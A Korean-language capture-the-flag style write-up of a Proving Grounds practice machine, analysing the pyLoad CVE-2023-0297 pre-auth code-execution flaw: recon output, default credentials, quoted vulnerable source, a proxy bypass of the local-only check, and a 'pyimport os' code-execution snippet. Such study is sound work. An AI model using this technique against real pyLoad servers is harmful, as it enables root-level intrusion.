---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/enum/searchsploit
  - tech/web/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.132.26
ports: [22, 9666]
services: [http, ssh]
cves: [CVE-2023-0297]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---
> [!info] PG Practice — pyLoader · Intermediate
> 타겟 192.168.132.26 · OS Ubuntu 22.04 (커널 5.15.0-75-generic, 호스트명 `pyloader`) · 플래그 1개 (`/root/proof.txt`)
> 경로 요약 — 9666 pyLoad 0.5.0 → CVE-2023-0297 pre-auth RCE (`/flash/addcrypted2` + `js2py` 의 `pyimport`) → 곧바로 root. **권한상승 단계가 아예 없다** — pyLoad 가 root 로 돌고 있었다.
> 취약 핸들러에는 "로컬에서만 허용" 검사가 붙어 있다. 그런데 pyLoad 자신의 `ClickNLoad` 애드온이 9666 을 외부에 열어 웹UI로 프록시하는 바람에 그 검사가 무력화된다(2-3).

## 0. 이 박스에서 배우는 것

- 샌드박스 안에서 돌린다는 것은 방어가 아니다. `js2py` 는 JS 를 파이썬으로 번역해 실행하는 라이브러리이고, `pyimport` 라는 자체 확장 키워드가 파이썬 모듈을 그대로 JS 스코프로 끌어온다
- 앱이 스스로 놓은 프록시가 자기 접근제어를 우회시킨다. `REMOTE_ADDR` 기반 "로컬 전용" 판정은 같은 호스트의 프록시 한 겹이면 무너지는데, 이 박스는 그 프록시를 애플리케이션이 직접 켜둔다
- **인증 없이 닿는 엔드포인트 하나가 전체 인증을 무의미하게 만든다.** 로그인 폼이 멀쩡히 있어도 `/flash/*` 가 화이트리스트에 있으면 끝이다
- **서비스가 어떤 계정으로 도는가를 먼저 본다.** 이 박스는 `/root/.pyload` 가 설정 폴더라는 사실 하나로 foothold = root 가 확정된다
- 익스플로잇 스크립트를 읽고 `curl` 한 줄로 환원해두면, 시험장에서 남의 스크립트가 안 돌 때 살아남는다
- **URL 인코딩은 페이로드의 일부다.** `&` 하나를 안 감싸면 파라미터가 잘려 페이로드가 통째로 죽는다

시험에 나올 만한 요소를 추려두면 이렇다.

| 요소 | 출제 가능성 | 이유 |
|---|---|---|
| "버전 확인 → CVE → 공개 익스플로잇" 단순 체인 | 매우 높음 | OSCP 시험 머신의 foothold 상당수가 이 모양이다. 관건은 CVE를 아는 것이 아니라 버전을 정확히 못 박는 것 |
| 비표준 고포트에 붙은 관리 웹앱 (9666) | 높음 | 제품명이 곧 검색 키워드다. 9666 자체는 `nmap-services` 등재 포트라 기본 스캔에도 잡힌다(1-1) — 진짜 위험은 미등재 고번호다 |
| 인터프리터 샌드박스 탈출 (js2py·Jinja2 SSTI·Node `vm`) | 중간 | pyLoad 자체는 안 나오겠지만 템플릿/스크립트 엔진에 문자열을 넘기면 코드 실행이 된다는 유형은 SSTI로 반드시 나온다 |
| 서비스가 root로 도는 오설정 | 높음 | 권한상승 단계를 통째로 건너뛰게 해준다. 셸을 잡으면 `id` 부터 치는 이유 |

변형은 이런 모습이다 — pyLoad 대신 Jenkins 스크립트 콘솔, js2py 대신 Jinja2/Twig SSTI, `pyimport` 대신 `__class__.__mro__`. 인터프리터에 도달했다면 이미 RCE 라는 결론은 그대로다.

난이도는 Intermediate 지만 실제 소요는 25분 남짓이다(정찰 시작 10:45:55 → root 셸 11:11 이전). 근거는 6-①의 타임스탬프 복원이다. 권한상승도 없으니 "어떻게 풀었나"는 별로 길게 쓸 것이 없고, 이 노트의 본체는 2장 — 왜 페이로드가 저렇게 생겼는지를 조각별로 뜯어놓은 부분이다.

---

## 1. 정찰

### 1-1. Nmap 원문

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ nnmap 192.168.132.26
# Nmap 7.98 scan initiated Mon Jun 29 10:45:55 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.132.26
Nmap scan report for 192.168.132.26
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.132.26:9666/
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Cheroot/8.6.0
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.52 ms 192.168.45.1
2   66.47 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.26 ms 192.168.132.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 29 10:46:49 2026 -- 1 IP address (1 host up) scanned in 53.56 seconds
```

`nnmap` 은 표준 도구가 아니라 칼리 `~/.zshrc` 에 있는 개인 별칭이다.

```bash
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

nmap이 로그 첫 줄에 남긴 실제 argv가 그것을 확인해준다 — `/usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. `--privileged` 와 `/usr/lib/nmap/nmap` 경로는 Kali 의 `/usr/bin/nmap` 래퍼가 붙인 것이다(nmap 바이너리에 capability가 부여돼 있어 `sudo` 없이도 SYN 스캔이 된다). **시험장 머신에는 이 별칭이 없다.** 아래 표의 플래그를 손으로 칠 수 있어야 한다.

플래그별로 무엇이 걸려 있는지.

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 이 박스에서는 손해가 없다. 9666은 `nmap-services`에 `zoomcp`로 등재돼 있고 빈도 `0.000304`로 top-1000 안이라 기본 스캔도 9666을 프로브한다(아래 참조). `-p-` 의 실익은 **등재되지 않은 고번호 포트**에서 나온다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Login - pyLoad`가 안 나온다. `9666/tcp open unknown` 만 보고 무엇인지 모른 채 넘어간다 |
| `-Pn` | ping 사전 탐지 생략 | PG 랩은 ICMP를 막는 경우가 흔하다. 빼면 "호스트 다운"으로 스캔 자체를 건너뛴다 |
| `-A` | OS 추측 + traceroute | 여기서는 오히려 틀렸다(아래 참조). 있어도 손해는 없다 |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔이 53초에 끝났다. 빼면 수십 분이다 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 재실행 없이 다시 본다. 시험 리포트 증거로도 쓴다 |

> [!danger] "9666은 기본 1000포트에 없다"는 틀렸다
> "`-p-` 없이 스캔하면 22번만 보인다"는 반증된다. Kali nmap 7.98 실측:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ grep -P "\t9666/tcp\t" /usr/share/nmap/nmap-services
> zoomcp	9666/tcp	0.000304	# Zoom Control Panel Game Server Management
>
> └─$ awk -F'\t' '$2 ~ /\/tcp$/ {print $3}' /usr/share/nmap/nmap-services | sort -rn | sed -n 1000p
> 0.000152                    ← top-1000 의 커트라인 빈도
> ```
> 9666의 빈도 `0.000304` 는 커트라인 `0.000152` 의 두 배다. **top-1000 안에 있고, 기본 스캔이 실제로 프로브한다.**
> ```bash
> └─$ nmap -sT -Pn --top-ports 1000 --packet-trace 127.0.0.1 | grep -c ":9666"
> 2
> ```
>
> 그래도 `-p-` 는 생략하지 않는다. 다만 근거를 바꿔야 한다 — 실익은 `nmap-services` 에 등재되지 않은 고번호 포트에서 나온다. [[Hawat]]의 50080 이 그 사례이고, 거기서는 `-p-` 가 없으면 박스가 통째로 끝난다. 좋은 습관을 틀린 근거로 가르치면 독자가 다른 박스에서 top-1000을 과소평가하게 된다. ([[_WRITEUP-STANDARD]] 「단정형 일반 지식은 반드시 때려보고 넣는다」의 Hub 사례와 같은 유형)

> [!danger] `-A` 의 OS 추측을 믿지 마라 — 이 박스가 반례다
> nmap은 `MikroTik RouterOS 7.2 - 7.5` 를 후보로 내놨다. 실제로는 **Ubuntu 22.04** 다.
> TCP/IP 스택 지문은 가상화 계층·NAT·중간 홉을 4번 지나면 쉽게 뭉개진다. 훨씬 신뢰할 수 있는 근거는 서비스 배너의 패키지 리비전이다:
> ```
> OpenSSH 8.9p1 Ubuntu 3ubuntu0.1     ← 8.9p1 = Ubuntu 22.04 (jammy) 기본 패키지
> ```
> `-3ubuntu0.1` 같은 데비안/우분투 패키지 리비전 접미사는 배포판과 릴리스를 거의 확정해준다. 이 습관은 [[Codo]]에서도 같은 방식으로 정리했다.
> 뒤에서 pyLoad 정보 페이지가 커널 문자열까지 그대로 뱉어 교차 검증된다(1-3).

`Not shown: 65533 closed tcp ports (reset)` 도 읽을 값어치가 있다. `closed` 는 RST 가 돌아왔다는 뜻이다 — 호스트는 살아 있고, 그 포트에 서비스가 없으며, 방화벽이 패킷을 버리지 않는다. [[Squid]]처럼 `filtered`(무응답)가 대량으로 나오는 것과 정반대 상황이라, 여기서는 **보이는 2개가 전부**라고 믿어도 된다.

여기서 한 걸음 더 나가면 안 된다. "그러니 아웃바운드도 열려 있을 가능성이 높다"는 추론이 성립하지 않는다. `closed`(RST)는 타겟으로 들어오는 방향에 대한 정보일 뿐이고, 타겟에서 나가는 트래픽에 대해서는 아무것도 말해주지 않는다. 인바운드 무필터 + 아웃바운드 화이트리스트는 흔한 구성이다. 실제로 4444 리버스셸이 붙은 것은 사실이지만 **결과가 맞았던 것과 추론이 성립하는 것은 별개다.** 아웃바운드는 직접 때려봐야만 안다 — 리스너를 띄우고 포트를 바꿔가며 시도하는 수밖에 없다.

### 1-2. 9666 — pyLoad 로그인 화면

```
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.132.26:9666/
|_http-server-header: Cheroot/8.6.0
```

루트(`/`)를 요청하면 `/login?next=...`로 302 리다이렉트된다. 모든 것이 인증 뒤에 있는 것처럼 보이는데, 이 인상이 함정이다(2-3에서 뒤집힌다).

![[Pasted image 20260629105530.png]]

`Cheroot/8.6.0` 도 그냥 지나칠 줄이 아니다. `CherryPy wsgiserver` / `Cheroot` 는 파이썬 WSGI 서버이므로 **이 앱은 파이썬으로 짜였다.** 그것만으로 공격 가설이 좁혀진다 — 파이썬 웹앱이면 템플릿 인젝션(Jinja2), 역직렬화(pickle), `eval` 계열이 우선 후보이고 PHP 웹셸 업로드 같은 반사신경은 여기서 쓸모가 없다. 서버 헤더는 무엇을 공격할지가 아니라 무엇으로 짜였는지를 알려주는 줄이다.

`robots.txt`에 `Disallow: /` 한 줄이 있지만(`1 disallowed entry`) 숨겨진 경로 정보는 없다. 크롤링 차단일 뿐이다. `Disallow: /` 는 전부 막으라는 뜻이라 알려주는 경로가 하나도 없고, 반대로 `Disallow: /admin-x9/` 같은 항목이었다면 그 자체가 경로 유출이었을 것이다. 항목 수만 보고 단서가 있다고 판단하지 말고 내용을 열어보면 된다 — 여기서 시간을 쓸 가치는 없었다.

### 1-3. 기본 자격증명 → 버전 확정

pyLoad의 기본 자격증명을 검색해 `pyload / pyload`를 얻었다.

![[Pasted image 20260629105429.png]]

| 배포 형태 | 기본 계정 | 근거 등급 |
|---|---|---|
| pyLoad-ng (현행 기본) | `pyload` / `pyload` ← 이 박스 | 1차 사료 — `pyload/pyload` 소스의 `DEFAULT_USERNAME`/`DEFAULT_PASSWORD = APPID` |
| 구버전(0.4.x) | 고정 기본값이 없다 | 1차 사료 — `v0.4.20` 의 `module/setup.py` 가 `self.ask(_("Username"), "User")` 로 대화형 질문하고, `module/config/default.conf` 는 `str username : "Username" = None` |

구버전 기본 계정 `admin`/`password` 는 검색 결과에 흔히 도는 조합일 뿐 0.4.20 소스에는 근거가 없다. 설치 스크립트가 사용자에게 묻고, 제안 기본값은 `"User"` 이며, 설정 파일의 초기값은 `None` 이다. **[가정]** 어떤 배포판 패키지나 도커 이미지가 `admin`/`password` 를 심었을 가능성은 남지만 확인하지 못했다. 실전 영향은 없다 — 이 박스는 `pyload/pyload` 로 들어갔다. 다만 기본 계정이 무엇이라고 노트에 적으려면 소스를 열어야 한다. 검색 결과 두 번째 줄은 1차 사료가 아니다.

로그인 후 정보 페이지에서 버전과 실행 환경이 통째로 나온다:

![[Pasted image 20260629111029.png]]

| 항목 | 값 | 이 값이 왜 중요한가 |
|---|---|---|
| pyLoad Version | 0.5.0 | CVE-2023-0297의 영향 버전 판정 근거 |
| Python Version | 3.10.6 (main, May 29 2023) [GCC 11.3.0] | Ubuntu 22.04 기본 파이썬 |
| OS Platform | `posix linux Linux pyloader 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64` | 호스트명 `pyloader`·커널·Ubuntu 확정 — nmap의 MikroTik 추측을 뒤집는 독립 근거 |
| Installation Folder | `/usr/local/lib/python3.10/dist-packages/pyload` | `pip install` 로 시스템 전역 설치 (= root 권한으로 설치됨) |
| Config Folder | `/root/.pyload` | ★ pyLoad가 root로 돌고 있다 |
| Download Folder | `/root/Downloads/pyLoad` | ★ 같은 결론의 두 번째 독립 근거 |
| WebUI Port | 8000 | ★ 우리가 붙은 포트는 9666이다. 오타도 버그도 아니다 — `ClickNLoad` 애드온이 9666을 외부에 열어 8000으로 프록시하고 있다. pre-auth RCE가 성립하는 이유의 절반이 여기 있다(2-3) |

`Config Folder: /root/.pyload` 와 `Download Folder: /root/Downloads/pyLoad` — 일반 계정은 `/root/` 아래에 디렉터리를 만들 수 없다. **이 프로세스는 root다.** RCE에 성공하는 순간 그것이 곧 root 셸이라는 뜻이고, 이건 익스플로잇을 던지기 전에 이미 알 수 있었던 사실이다. 알고 있으면 셸을 잡은 뒤 `linpeas` 를 돌리는 10분을 아낀다.

웹앱 관리 화면에서 경로가 노출되면 반드시 읽는다. `/root/` 인지 `/home/<user>/` 인지 `C:\Users\<user>\` 인지가 실행 계정을 말해준다. [[Squid]]의 `phpinfo` → `C:\wamp\` 가 같은 계열의 습관이다.

`WebUI Port: 8000` 인데 응답은 9666에서 온다. 처음에는 설정값과 현실이 어긋나는 흔한 함정([[Squid]]의 MariaDB 3307 계열)으로 읽기 쉬운데, 여기서는 **둘 다 사실이다.** pyLoad 웹UI 본체는 `127.0.0.1:8000` 에서 돌고(기본값 `int port : "Port" = 8000`), `ClickNLoad` 애드온이 별도로 `0.0.0.0:9666` 을 열어 들어온 바이트를 그대로 8000으로 넘긴다. nmap이 9666에서 `Cheroot/8.6.0` 헤더를 본 것도 프록시가 응답을 가공 없이 통과시키기 때문이다 — 뒤쪽 Cheroot 의 헤더가 그대로 샌다. 이 구조가 왜 치명적인지는 2-3에서 소스로 확인한다.

한 가지 미진한 점은 근거의 개수다. pyLoad 0.5.0 의 근거는 애플리케이션이 스스로 렌더한 값 하나뿐이라 [[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]·[[Squid]]에서 굳혀온 "독립 근거 2개" 기준에 못 미친다. 다행히 CVE-2023-0297은 버전 판정이 틀려도 손해가 거의 없다 — 페이로드가 `curl` 한 줄이라 그냥 던지면 3초 안에 결론이 난다. **판정 비용이 시도 비용보다 크면 그냥 시도하는 편이 낫다.**

---

## 2. 취약점 분석 — CVE-2023-0297

나머지 전 페이지가 302로 튕기는데 `/flash/addcrypted2` 만 로그인 없이 닿는다. 그리고 거기에 문자열을 넘기면 파이썬 코드가 실행된다. 왜 그런지, 그리고 페이로드의 각 조각이 왜 저렇게 생겼는지를 순서대로 본다.

### 2-1. 배경 — pyLoad와 Click'n'Load

pyLoad는 **다운로드 매니저**다. 브라우저에서 "이 링크들 받아줘"를 눌렀을 때 링크 묶음을 받아 처리한다.

이 브라우저→로컬앱 연동이 **Click'n'Load(CNL)** 프로토콜이다. JDownloader 계열이 쓰던 방식을 pyLoad가 호환 구현했고, 그 수신구가 `/flash/*` 엔드포인트다.

CNL의 동작 개요:

```
① 웹사이트가 링크 묶음을 AES로 암호화해서 브라우저에 넘긴다   (crypted)
② 복호화 키는 자바스크립트 조각(jk) 형태로 함께 넘어온다
③ 로컬 다운로드 매니저는 그 JS 조각을 실행해서 키를 얻고
④ crypted 를 복호화해 링크 목록을 얻는다
```

③이 이 CVE의 전부다. **서버가 클라이언트에게서 받은 자바스크립트 문자열을 실행한다** — 설계상 그렇게 하도록 되어 있다.

설계상 코드를 실행하는 엔드포인트는 늘 1급 표적이다. 템플릿 렌더러, 수식 계산기, 규칙 엔진, 리포트 필터, 그리고 이런 프로토콜 어댑터까지 — 입력을 데이터가 아니라 프로그램으로 취급하는 지점은 전부 같은 유형이다. 이런 곳에서 물을 것은 인젝션이 되느냐가 아니라 샌드박스가 무엇이고 어디로 새느냐다.

### 2-2. `js2py` — 자바스크립트를 파이썬으로 번역해 실행한다

pyLoad는 JS 엔진을 내장하지 않는다. 대신 파이썬 라이브러리 `js2py` 를 쓴다. `js2py` 는 자바스크립트 소스를 파이썬 코드로 번역(transpile)한 뒤 파이썬 인터프리터에서 실행한다.

그리고 `js2py` 에는 순수 JS에 존재하지 않는 자체 확장 키워드가 있다:

```javascript
pyimport os          // ← 자바스크립트에 이런 문법은 없다. js2py가 추가한 것이다
os.system("id")      // 임포트된 파이썬 모듈이 JS 스코프의 객체가 된다
```

흔히 이걸 "js2py 샌드박스를 우회했다"고 설명하는데 사실이 아니다. **`pyimport` 는 js2py 가 의도적으로 제공하는 파이썬 상호운용 기능**이고, 탈출할 담장이 애초에 없었다. 그래서 페이로드에 난독화도, 프로토타입 체인 트릭도, `__class__.__mro__` 같은 우회도 필요 없다 — `pyimport os` 라고 쓰면 그냥 된다. 같은 계열의 착각이 Jinja2(`{{ ''.__class__ }}`), Node `vm` 모듈(`this.constructor.constructor`), Groovy 샌드박스에서 반복된다. 샌드박스에서 돌린다는 문장을 방어로 세기 전에, 그 샌드박스가 호스트 언어로 나가는 통로를 제공하는지부터 확인해야 한다.

`pyimport` 는 트랜스파일 단계에서 문자 그대로 파이썬 `import` 로 바뀐다. js2py 소스가 그대로 말해준다 (`js2py/translators/translating_nodes.py`):

```python
def PyimportStatement(type, imp):
    lib = imp['name']
    jlib = 'PyImport_%s' % lib
    code = 'import %s as %s\n' % (lib, jlib)
    ...
    code += 'var.pyimport(%s, %s)\n' % (repr(lib), jlib)
    return code
```

`pyimport os` → 생성 코드 `import os as PyImport_os` → 그 모듈이 JS 네임스페이스에 객체로 노출된다. 격리 계층이 존재한 적이 없다.

파서 쪽 기본값은 꺼져 있지만(`ENABLE_PYIMPORT = False`) `import js2py` 하는 순간 켜진다 (`js2py/translators/translator.py`):

```python
# Enable Js2Py exceptions and pyimport in parser
pyjsparser.parser.ENABLE_PYIMPORT = True
```

**명시적으로 끄지 않는 한 켜져 있는 것이 기본이다.** 끄는 API는 2016년부터 존재했다:

```python
def disable_pyimport():
    import pyjsparser.parser
    pyjsparser.parser.ENABLE_PYIMPORT = False
```

| 시점 | 사건 | 커밋 (실측) |
|---|---|---|
| 2015-03 | js2py에 `pyimport` 기능 추가 | — |
| 2016-11-15 | js2py에 `disable_pyimport()` 차단 API 추가 | `Js2Py` `718a7d1` *"Python 2.6, experimental ECMA 6 support and more!"* |
| 2018-08-09 | pyLoad가 js2py 최초 도입 | `pyload` `79a9cac1` *"[JsEngine] Add support for Js2Py and nodejs"* |
| 2019-06-05 | pyLoad가 js2py를 제거 (requests_html로 교체) | `pyload` `ec90b12c` *"Replace js2py with requests_html"* |
| 2020-08-20 | pyLoad가 js2py 재도입 — `disable_pyimport()` 를 호출하지 않음 | `pyload` `28572b3d` |
| 2023-01-03 | CVE-2023-0297 패치 = `disable_pyimport()` 한 줄 추가 | `pyload` `7d73ba79` |

재도입(2020-08-20)부터 패치(2023-01-03)까지 **약 2년 4개월간 무방비**였다. 차단 수단은 그보다 6년 2개월 앞선 2016-11-15부터 존재했다.

> [!warning] 한 번 걷어냈던 의존성이 되돌아왔다 — `git log` 한 줄로 보인다
> 이 구분이 중요한 이유는, 한 번 걷어냈던 의존성이 되돌아왔다는 것이 그 사이에 있었던 판단이 잊혔다는 뜻이기 때문이다. 되돌아온 코드에는 원래의 주의사항이 따라오지 않는다. 라이브러리 이력을 볼 때 `-S<키워드>` 로 전체 히스토리를 훑어야 이런 왕복이 보인다:
> ```bash
> git log --oneline --reverse -S"js2py" --date=short --format="%h %ad %s"
> ```

js2py 공식 문서에는 보안 경고가 없다. README는 `pyimport` 를 순수 기능으로만 소개하고 `untrusted`·`security`·`sandbox`·`malicious` 같은 단어가 한 번도 나오지 않는다. 개발자가 위험하다는 것을 문서에서 배울 기회가 없었다는 뜻이다. 라이브러리를 신뢰 경계에 놓을 때는 문서가 말해주기를 기다릴 게 아니라, 이 라이브러리가 호스트 언어로 나가는 통로를 제공하는지를 직접 확인해야 한다.

### 2-3. 왜 인증 없이 닿는가 — 소스 3개를 겹쳐야 답이 나온다

pyLoad 웹UI는 로그인 세션이 없으면 전 페이지를 `/login?next=...`로 302 리다이렉트한다 — nmap이 관측한 그대로다. 그런데 `/flash/*` 만은 다르다.

① 취약 핸들러에는 세션 인증이 아예 없다.

`src/pyload/webui/app/blueprints/cnl_blueprint.py` (패치 직전 커밋 `6aa71cd9`):

```python
@bp.route("/flash/addcrypted2", methods=["POST"], endpoint="addcrypted2")
@local_check
def addcrypted2():
    package = flask.request.form.get(
        "package", flask.request.form.get("source", flask.request.form.get("referer"))
    )
    crypted = flask.request.form["crypted"]
    jk = flask.request.form["jk"]
    pack_password = flask.request.form.get("passwords")

    crypted = standard_b64decode(unquote(crypted.replace(" ", "+")))
    jk = eval_js(f"{jk} f()")
```

다른 블루프린트는 `login_required(perm)` 데코레이터를 쓴다. `cnl_blueprint.py` 에는 그 데코레이터가 임포트조차 되어 있지 않고, 대신 `@local_check` 하나가 붙어 있다.

인젝션 지점은 **`jk = eval_js(f"{jk} f()")`** 다. 폼 파라미터가 f-string 으로 필터 없이 연결되고 뒤에 `f()` 호출이 붙는다 — 2-5에서 페이로드가 `f=function f2(){};` 로 끝나는 이유가 이 한 줄이다.

② `local_check` 는 `REMOTE_ADDR` 을 믿는다.

같은 파일의 데코레이터 원문:

```python
#: decorator
def local_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        remote_addr = flask.request.environ.get("REMOTE_ADDR", "0")
        http_host = flask.request.environ.get("HTTP_HOST", "0")

        if remote_addr in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost") or http_host in (
            "127.0.0.1:9666",
            "[::1]:9666",
        ):
            return func(*args, **kwargs)
        else:
            return "Forbidden", 403

    return wrapper
```

설계 의도는 "CNL 요청은 로컬 브라우저에서만 온다"는 것이다. 실제로 우리 요청은 `REMOTE_ADDR = 192.168.45.156`, `HTTP_HOST = 192.168.132.26:9666` 이라 양쪽 다 불일치이고 **403이어야 한다.** 그런데 셸이 붙었다.

③ pyLoad 자신이 9666에 프록시를 세워 `REMOTE_ADDR` 을 위조해준다.

`src/pyload/plugins/addons/ClickNLoad.py` — pyLoad 기본 탑재 애드온이다:

```python
class ClickNLoad(BaseAddon):
    __config__ = [
        ("enabled", "bool", "Activated", True),
        ("port", "int", "Port", 9666),
        ("extern", "bool", "Listen for external connections", True),
        ...
    ]

    def init(self):
        self.cnl_ip = "" if self.config.get("extern") else "127.0.0.1"
        self.cnl_port = self.config.get("port")
```

```python
    @threaded
    def _find_backend(self):
        ...
            web_host = self.pyload.config.get("webui", "host")
            web_port = self.pyload.config.get("webui", "port")
            if web_host in ("0.0.0.0", "::"):
                web_host = "127.0.0.1"          # ← 백엔드에 루프백으로 접속한다
```

```python
                    client_socket, client_addr = dock_socket.accept()
                    ...
                        backend_socket = socket.socket(self.web_af, socket.SOCK_STREAM)
                        ...
                        backend_socket.connect(self.web_addr)
                        self.forward(client_socket, backend_socket, ...)
```

세 가지 기본값이 겹쳐서 이 결과가 나온다.

| 설정 | 기본값 | 결과 |
|---|---|---|
| `enabled` | `True` | 애드온이 그냥 돈다. 관리자가 켠 적이 없어도 켜져 있다 |
| `port` | `9666` | nmap이 본 그 포트 |
| `extern` | `True` | `cnl_ip = ""` → `0.0.0.0` 바인드 → 인터넷에서 접근 가능 |

그리고 `forward()` 는 원시 TCP 바이트를 그대로 중계한다. HTTP를 해석하지 않으므로 `X-Forwarded-For` 를 붙이지도, `Host` 를 고치지도 않는다.

데이터 흐름 전체를 이어보면 이렇게 된다.

```
공격자(192.168.45.156)
   │  POST /flash/addcrypted2   Host: 192.168.132.26:9666
   ▼
[0.0.0.0:9666]  ClickNLoad 애드온 (extern=True)      ← pyLoad가 스스로 연 포트
   │  accept() 후 backend_socket.connect(("127.0.0.1", 8000))
   │  바이트 그대로 전달 (헤더 가공 없음)
   ▼
[127.0.0.1:8000]  Cheroot / Flask 웹UI
   │  REMOTE_ADDR = "127.0.0.1"   ← ★ 프록시의 출발지 주소로 뒤바뀌었다
   ▼
local_check → remote_addr in ("127.0.0.1", ...) → True → 통과
   ▼
eval_js(f"{jk} f()")  →  js2py  →  pyimport os  →  os.system()  →  root
```

> [!warning] 이 결론의 근거 등급 — 소스는 실측, 박스 구성은 추론이다
> 위 흐름도에서 소스 인용(애드온 기본값 `enabled=True`·`port=9666`·`extern=True`, 웹UI 기본 포트 8000, `local_check` 구현)은 전부 1차 사료 실측이다.
> **[가정]** 다만 이 박스의 `pyload.cfg` 를 직접 읽어 `extern=True` 임을 확인하지는 않았다. 셸에서 `cat /root/.pyload/settings/pyload.cfg` 와 `ss -lntp` 를 찍었어야 완결됐다.
> 그럼에도 이 설명을 채택하는 근거는 셋이다 — ⑴ 정보 페이지가 웹UI 포트를 8000으로 렌더했고, ⑵ nmap은 9666에서 응답을 받았으며, ⑶ 원격 요청이 `local_check` 를 통과했다(셸이 붙었다). 세 관측을 동시에 설명하는 구성은 이것뿐이다.
> 대안 가설로 배포된 판본에 `local_check` 가 없었을 가능성이 남는다. 그러나 커밋 이력상 `local_check` 는 2020년 이전부터 이 파일에 존재하고 2021-01에 IPv6 보정까지 받았으므로, 취약 판본(2022~2023 dev 빌드)에 없었을 가능성은 낮다.

`local_check` 자체는 틀린 코드가 아니다. 프록시가 없었다면 의도대로 동작한다. 무너뜨린 것은 **애플리케이션이 스스로 켜둔 `extern=True` 프록시**다. 보안 검사와 그것을 우회시키는 기능이 같은 제품 안에 기본값으로 공존한다.

실전에서도 자주 나오는 모양이다. nginx/Apache 뒤의 앱이 `REMOTE_ADDR` 로 관리자 IP를 판정하면 프록시를 거친 요청이 전부 `127.0.0.1` 이 되고, `X-Forwarded-For` 를 검증 없이 신뢰하면 헤더 하나로 내부 IP를 위장할 수 있다. Kubernetes Service 나 로드밸런서를 거치며 출발지가 뭉개지는 것도, SSRF로 내부에서 요청을 만들어내는 것도 같은 효과다. [[Squid]]의 오픈 프록시가 정확히 이 구조였는데, 거기서는 공격자가 프록시를 이용했고 여기서는 앱이 프록시를 제공한다는 점만 다르다. 판정 기준은 하나다 — 이 검사가 출발지 IP를 믿는다면, **그 IP를 바꿔줄 중간 홉이 있는지** 찾는다. 있으면 검사는 없는 것이다.

인증 우회를 찾을 때의 첫 수순은 인증 예외 목록이다. 앱 전체가 로그인 뒤에 있어 보여도 예외 화이트리스트는 거의 항상 존재한다 — 헬스체크·메트릭(`/health`, `/metrics`, `/actuator/*`), 콜백·웹훅(`/callback`, `/webhook/*`, `/notify`), 정적 자원 핸들러(`/static/*`, 경로 트래버설로 이어진다), 연동 프로토콜 수신구(`/flash/*`, `/xmlrpc.php`, `/jsonrpc` — 이 박스가 여기다), 그리고 `/api/v1/*` 는 인증하는데 `/api/v2/*` 는 빠져 있는 API 버전 프리픽스.

> [!tip] `/flash/*` 는 숨겨서 막을 수 없다
> 이 블루프린트에는 두 가지가 더 붙어 있다 — 경로 프리픽스 면제와 와일드카드 CORS:
> ```python
> #: url_prefix here is intentional since it should not be affected by path prefix
> bp = flask.Blueprint("flash", __name__, url_prefix="/")
> ...
> response.headers.update({'Access-Control-Allow-Origin': "*", ...})
> ```
> 관리자가 웹UI를 `/pyload/` 같은 하위 경로로 옮겨도 `/flash/*` 는 루트에 그대로 남는다.

### 2-4. 영향 범위와 패치 — 1차 사료 기준

| 항목 | 값 | 근거 |
|---|---|---|
| 패키지 | `pyload-ng` (PyPI) | GHSA `GHSA-pf38-5p22-x6h6` |
| 취약 범위 | `< 0.5.0b3.dev31` | 같은 GHSA (`vulnerable_version_range`) |
| 최초 패치 버전 | `0.5.0b3.dev31` (PyPI 업로드 2023-01-03) | 같은 GHSA + PyPI |
| NVD 표현 | "prior to 0.5.0b3.dev31" | NVD CVE-2023-0297 |
| CVSS v3.1 | 9.8 CRITICAL `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | NVD·GHSA 일치 |
| CWE | CWE-94 Code Injection | NVD·GHSA |

